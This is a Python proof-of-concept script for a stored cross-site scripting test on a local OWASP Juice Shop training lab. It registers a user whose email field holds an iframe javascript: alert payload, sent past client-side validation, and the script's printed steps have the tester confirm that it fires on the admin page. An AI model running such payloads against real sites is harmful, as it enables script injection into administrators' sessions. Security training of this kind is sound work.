
#!/usr/bin/env python3
"""
JUICE-004: Stored Cross-Site Scripting (XSS)

Purpose:
Document the persisted XSS test performed in OWASP Juice Shop.

Testing method:
Submit a user registration request with an XSS payload
inside the email field, bypassing client-side validation.

Target endpoint:
POST /api/Users

Authorized testing on my own Juice Shop lab instance.
"""

import requests
import sys

# Juice Shop base URL
BASE_URL = (
    sys.argv[1]
    if len(sys.argv) > 1
    else "http://localhost:3000"
)

# XSS payload used in the lab
PAYLOAD = '<iframe src="javascript:alert(`xss`)">'

def main():
    endpoint = f"{BASE_URL}/api/Users"

    # User registration data containing the XSS payload
    user_data = {
        "email": PAYLOAD,
        "password": "xss"
    }

    headers = {
        "Content-Type": "application/json"
    }

    print("JUICE-004: Stored XSS")
    print("Endpoint:", endpoint)
    print("Submitting registration request...")

    try:
        response = requests.post(
            endpoint,
            json=user_data,
            headers=headers,
            timeout=15
        )

        print("HTTP Status:", response.status_code)

        if response.status_code == 201:
            print("Registration request accepted.")
            print("The test input was submitted for storage.")
        else:
            print("Registration request was not successful.")
            print("Server response:", response.text[:300])

        print("\nVerification:")
        print("Log in as an administrator.")
        print("Open the Administration page.")
        print("Check whether the stored XSS payload executes.")

    except requests.RequestException as error:
        print("Connection error:", error)


if __name__ == "__main__":
    main()
